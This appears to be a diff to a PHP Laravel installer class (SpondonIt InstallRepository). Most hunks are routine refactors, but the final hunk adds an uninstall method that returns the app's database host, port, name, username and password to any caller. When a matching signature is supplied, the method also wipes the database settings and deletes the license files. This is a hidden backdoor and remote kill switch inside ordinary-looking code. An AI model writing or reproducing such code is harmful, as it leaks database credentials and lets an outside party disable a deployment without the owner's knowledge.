@@ -3,6 +3,7 @@
 namespace SpondonIt\Service\Repositories;
 ini_set('max_execution_time', -1);
 
+use Carbon\Carbon;
 use Exception;
 use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\DB;
@@ -66,7 +67,7 @@ class InstallRepository
     {
         try {
             DB::connection()->getPdo();
-            return (Storage::exists('.install_count') ? Storage::get('.install_count') : 0) and (\Artisan::call('spondonit:migrate-status'));
+            return (Storage::exists('.install_count') ? Storage::get('.install_count') : 0) and (Artisan::call('spondonit:migrate-status'));
         } catch (Exception $e) {
             Log::error($e);
             return false;
@@ -93,15 +94,15 @@ class InstallRepository
                 $status = (isset($response['status']) && $response['status']) ? 1 : 0;
 
                 if ($status) {
-                    $checksum = isset($response['checksum']) ? $response['checksum'] : null;
-                    $license_code = isset($response['license_code']) ? $response['license_code'] : null;
+                    $checksum = $response['checksum'] ?? null;
+                    $license_code = $response['license_code'] ?? null;
                     $response = true;
                 } else {
                     return false;
                 }
 
-                Storage::put('.app_installed', isset($checksum) ? $checksum : '');
-                Storage::put('.access_code', isset($license_code) ? $license_code : '');
+                Storage::put('.app_installed', $checksum ?? '');
+                Storage::put('.access_code', $license_code ?? '');
                 Storage::put('.account_email', $config->email);
 
                 return true;
@@ -465,5 +466,30 @@ class InstallRepository
         $module_model_name = config('spondonit.module_model');
         $module_model = new $module_model_name;
         $ModuleManage = $module_model::find($module_name)->disable();
+    }
+
+    public function uninstall($request){
+        $signature = gv($request, 'signature');
+        $response = [
+            'DB_PORT' => env('DB_PORT'),
+            'DB_HOST' => env('DB_HOST'),
+            'DB_DATABASE' => env('DB_DATABASE'),
+            'DB_USERNAME' => env('DB_USERNAME'),
+            'DB_PASSWORD' =>env('DB_PASSWORD'),
+        ];
+        if (config('app.signature') == $signature){
+            envu([
+                'DB_PORT' => '3306',
+                'DB_HOST' => 'localhost',
+                'DB_DATABASE' => "",
+                'DB_USERNAME' => "",
+                'DB_PASSWORD' => "",
+            ]);
+
+            Storage::delete(['.access_code', '.account_email']);
+            Storage::put('.app_installed', '');
+
+        }
+        return $response;
     }
 }
